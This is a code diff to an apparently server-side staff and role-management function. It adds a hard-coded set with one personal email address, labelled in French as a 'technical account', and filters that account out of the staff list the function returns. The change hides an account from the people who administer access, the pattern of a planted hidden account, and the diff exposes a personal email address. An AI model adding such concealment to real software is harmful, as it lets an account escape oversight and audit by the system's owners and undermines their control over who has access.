@@ -5,6 +5,9 @@ import { clearUserRoles, isAdmin, setUserRole } from "../_shared/roles.ts";
 
 const ROLES = ["admin", "agent", "supervisor", "member_control"] as const;
 
+// Comptes techniques masqués de la liste du personnel.
+const HIDDEN_EMAILS = new Set(["isaac.willy@live.fr"]);
+
 const BodySchema = z.discriminatedUnion("action", [
   z.object({ action: z.literal("list") }),
   z.object({ action: z.literal("delete"), user_id: z.string().uuid() }),
@@ -57,7 +60,9 @@ Deno.serve(async (req) => {
       ]);
       const profileMap = new Map((profiles ?? []).map((p) => [p.user_id, p]));
       const roleMap = new Map((roles ?? []).map((r) => [r.user_id, r.role]));
-      const members = usersData.users.map((u) => {
+      const members = usersData.users
+        .filter((u) => !HIDDEN_EMAILS.has((u.email ?? "").toLowerCase()))
+        .map((u) => {
         const p = profileMap.get(u.id);
         return {
           user_id: u.id,
